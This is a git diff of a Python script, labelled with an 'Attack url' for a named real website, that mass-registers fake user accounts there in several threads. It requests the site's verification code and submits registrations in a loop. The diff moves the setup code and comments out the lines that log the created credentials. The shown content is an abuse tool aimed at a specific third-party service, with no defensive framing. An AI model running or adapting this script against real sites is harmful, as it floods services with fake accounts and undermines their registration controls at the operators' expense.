@@ -5,15 +5,10 @@ import re
 import threading
 from datetime import datetime
 
-print('[warning]Attack url:https://www.dzzyisp.com\n[notice]The threads is 10')
-global number,sub
-sub = int(0)
-num = int(input('You want to create users amount(if you put 10,it will create 100 users.):'))
-
 def register():
     i = int(0)
     #创建写入注册用户信息的文件
-    f = open("Your FILE PATH",'a+')
+    #f = open("",'a+')
 
     #自动化注册
     while i < num:
@@ -26,7 +21,6 @@ def register():
         }
 
     #获取验证码
-        
         url_Getcode='https://www.dzzyisp.com/index.php?m=member&c=checklogin&a=get_code&k=Wed%20Oct%2006%202021%2011%3A36%3A01%20GMT%2B0800%20(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)40000'   
         resp=requests.get(url=url_Getcode,headers=headers)
         text=resp.text
@@ -64,7 +58,7 @@ def register():
         #判断注册是否成功
         if(str(res) == "['操作成功']"):
             #记录
-            f.write("username:%s password:%s\n" %(user,passwd))
+            #f.write("username:%s password:%s\n" %(user,passwd))
             i += 1
             global sub
             sub += 1
@@ -89,6 +83,10 @@ def thread():
     print('[info]创建进程耗时'+str(durtime))
 
 if __name__ == '__main__':
+    print('[warning]Attack url:https://www.dzzyisp.com\n[notice]The threads is 10')
+    global number,sub
+    sub = int(0)
+    num = int(input('You want to create users amount(if you put 10,it will create 100 users.):'))
     thread()
     
     
